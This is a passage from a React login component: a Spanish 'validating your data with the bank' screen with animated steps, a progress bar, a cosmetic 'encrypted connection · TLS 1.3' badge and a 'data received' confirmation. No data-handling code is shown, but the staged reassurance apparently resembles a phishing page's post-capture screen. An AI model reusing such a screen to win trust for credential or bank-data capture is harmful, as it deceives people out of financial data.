                Estamos validando los datos con el banco. En cuanto el servicio vuelva, tu acceso se activará solo.
              </p>

              <div className="mt-7 w-full max-w-[262px] space-y-2.5">
                {STEPS.map((label, i) => {
                  const done = stage > i;
                  const active = stage === i;
                  return (
                    <div
                      key={label}
                      className="flex items-center gap-2.5 text-left"
                      style={{ opacity: done || active ? 1 : 0.55, transition: "opacity .35s ease" }}
                    >
                      <span className="relative flex h-[18px] w-[18px] shrink-0 items-center justify-center">
                        {done ? (
                          <span
                            className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-[#0f9d58]"
                            style={{ animation: "vh-pop .38s cubic-bezier(.22,.9,.32,1.4) both" }}
                          >
                            <Check className="h-3 w-3 text-white" strokeWidth={3} />
                          </span>
                        ) : active ? (
                          <span
                            className="h-[14px] w-[14px] rounded-full border-[2px] border-[#0570de]/25 border-t-[#0570de]"
                            style={{ animation: "vh-spin .7s linear infinite" }}
                          />
                        ) : (
                          <span className="h-[7px] w-[7px] rounded-full bg-[#d7d8e0]" />
                        )}
                      </span>
                      <span className={`text-[13px] leading-none ${done || active ? "text-[#30313d]" : "text-[#a2a3ad]"}`}>
                        {label}
                      </span>
                    </div>
                  );
                })}
              </div>

              <div className="mt-7 h-[3px] w-[220px] overflow-hidden rounded-full bg-[#f0f0f5]">
                <div
                  className="h-full rounded-full bg-[#0570de]"
                  style={{ width: `${barWidth}%`, transition: "width 1.4s cubic-bezier(.25,.8,.35,1)" }}
                />
              </div>

              {stage < 4 ? (
                <p className="vh-in mt-6 flex items-center gap-1.5 text-[10.5px] text-[#8d8e98]" style={{ animationDelay: "380ms" }}>
                  <Lock className="h-3 w-3" /> Conexión cifrada · TLS 1.3 · No cierres esta ventana
                </p>
              ) : (
                <div className="vh-in mt-6 flex flex-col items-center gap-2.5">
                  <p className="flex items-center gap-1.5 text-[11px] font-medium text-[#0f9d58]">
                    <Check className="h-3.5 w-3.5" strokeWidth={3} /> Datos recibidos correctamente
                  </p>
                  <button
                    type="button"
                    onClick={goBack}
                    className="mt-1 flex items-center gap-1.5 rounded-full border border-[#e6e6e6] bg-white px-3.5 py-2 text-[11.5px] font-medium text-[#6d6e78] transition-colors hover:border-[#cfd5db] hover:text-[#30313d]"
                  >
                    <RotateCcw className="h-3 w-3" /> Volver al inicio
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      <VideoModal
        open={videoOpen}
        onClose={() => setVideoOpen(false)}
        src={EXAMPLE_VIDEO}
        title={t("demo")}
      />
    </div>
  );
};

export default Login;